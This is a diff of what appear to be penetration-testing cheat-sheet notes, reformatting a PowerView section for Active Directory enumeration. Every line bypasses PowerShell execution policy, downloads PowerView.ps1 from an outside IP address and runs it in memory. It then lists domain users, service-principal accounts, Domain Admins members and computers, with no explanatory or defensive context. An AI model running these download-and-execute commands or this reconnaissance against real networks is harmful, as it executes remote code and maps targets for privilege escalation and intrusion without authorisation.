@@ -25,17 +25,24 @@
 
 PowerView:
 - [USER]
-	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-Domain"
-	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser"
-	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -SPN"
-	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Properties 		samaccountname,memberof"
-	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Properties 		samaccountname,description"
+	-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-Domain"
+	
+	-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser"
+	
+	-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -SPN"
+	
+	-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Properties 		samaccountname,memberof"
+	
+	-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Properties 		samaccountname,description"
 
-[GROUP]
-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroup -Name 'Domain Admins' "
-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1');  Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName "
-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroupMember -Name 'Domain admins' "
-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroup -Domain 'xor.com'"
+- [GROUP]
+	-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroup -Name 'Domain Admins'"
+	
+	-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1');  Get-DomainGroup | where Name -like 	    "*Admin*" | select SamAccountName "
+	
+	-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroupMember -Name 'Domain 	    admins' "
+	
+	-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroup -Domain 'xor.com'"
 
 [COMPUTER]
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-NetComputer | select samaccountname, operatingsystem"
